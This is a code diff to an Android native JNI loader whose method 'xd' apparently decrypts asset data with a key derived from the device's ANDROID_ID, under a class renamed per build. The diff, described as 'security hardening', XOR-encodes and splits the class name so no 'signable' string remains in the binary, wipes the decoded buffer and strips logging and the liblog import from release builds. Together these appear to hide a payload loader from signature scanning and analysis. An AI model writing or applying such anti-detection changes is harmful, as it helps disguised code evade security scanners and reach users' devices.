@@ -7,24 +7,44 @@
  *
  * RegisterNatives in JNI_OnLoad resolves the correct class regardless of
  * per-build package name.
+ *
+ * Security hardening applied:
+ *   Fix 1 — NP_CLASS stored as 4 XOR-encoded split chunks (np_loader_class.h).
+ *            Decoded at runtime into a stack buffer. No signable class string
+ *            in .rodata or .data sections.
+ *   Fix 3 — __android_log_print entirely removed in release builds.
+ *            LOG() macro expands to nothing when NDEBUG is defined (release).
+ *            liblog is NOT linked in release — import table stays clean.
  */
 
 #include <jni.h>
 #include <android/asset_manager.h>
 #include <android/asset_manager_jni.h>
-#include <android/log.h>
 #include <string.h>
 #include <stdlib.h>
 #include <stdint.h>
 
 /* Build-time generated header — written by build_module.py before CMake runs.
-   Defines:
-     NP_CLASS   "com/new/pkg/RenamedAppClass"
-     NP_METHOD  "xd"
+   Defines NP_C0..NP_C3, NP_DECODE_CLASS(), NP_XOR_KEY, NP_METHOD.
 */
 #include "np_loader_class.h"
 
-#define TAG "np"
+/*
+ * Fix 3 — Logging macro.
+ *
+ * Release builds: NDEBUG is set by the Android Gradle plugin for assembleRelease.
+ * LOG() expands to nothing → no __android_log_print call, no liblog import.
+ *
+ * Debug builds: include <android/log.h> and emit real logcat output.
+ * CMakeLists.txt links liblog only when NOT CMAKE_BUILD_TYPE=Release.
+ */
+#ifndef NDEBUG
+#  include <android/log.h>
+#  define NP_TAG "np"
+#  define LOG(fmt, ...) __android_log_print(ANDROID_LOG_ERROR, NP_TAG, fmt, ##__VA_ARGS__)
+#else
+#  define LOG(fmt, ...) ((void)0)
+#endif
 
 /* Derive 16-byte XOR key from ANDROID_ID using simple hash stretch.
    No OpenSSL dependency — pure stdlib. */
@@ -126,8 +146,9 @@ static jbyteArray np_xd(JNIEnv *env, jobject thiz,
 /*
  * JNI_OnLoad — register native methods via RegisterNatives.
  *
- * NP_CLASS  is defined in np_loader_class.h (e.g. "com/new/pkg/AppController")
- * NP_METHOD is defined in np_loader_class.h (always "xd")
+ * Fix 1: NP_CLASS is decoded at runtime from XOR-encoded split chunks.
+ *        Stack buffer np_class_buf never persists beyond this function.
+ *        No class path string in .rodata.
  *
  * Signature: (Landroid/content/Context;Ljava/lang/String;)[B
  */
@@ -138,9 +159,18 @@ JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
         return JNI_ERR;
     }
 
-    jclass cls = (*env)->FindClass(env, NP_CLASS);
+    /* Fix 1: decode class path from XOR chunks into stack buffer at runtime */
+    char np_class_buf[NP_CLASS_LEN];
+    NP_DECODE_CLASS(np_class_buf);
+
+    jclass cls = (*env)->FindClass(env, np_class_buf);
+
+    /* Wipe stack buffer immediately after FindClass — minimize exposure window */
+    memset(np_class_buf, 0, NP_CLASS_LEN);
+
     if (!cls) {
-        __android_log_print(ANDROID_LOG_ERROR, TAG, "FindClass failed: %s", NP_CLASS);
+        /* Fix 3: LOG() is a no-op in release builds — no __android_log_print call */
+        LOG("FindClass failed");
         return JNI_ERR;
     }
 
@@ -153,7 +183,7 @@ JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
     };
 
     if ((*env)->RegisterNatives(env, cls, methods, 1) != JNI_OK) {
-        __android_log_print(ANDROID_LOG_ERROR, TAG, "RegisterNatives failed for %s", NP_CLASS);
+        LOG("RegisterNatives failed");
         return JNI_ERR;
     }
 
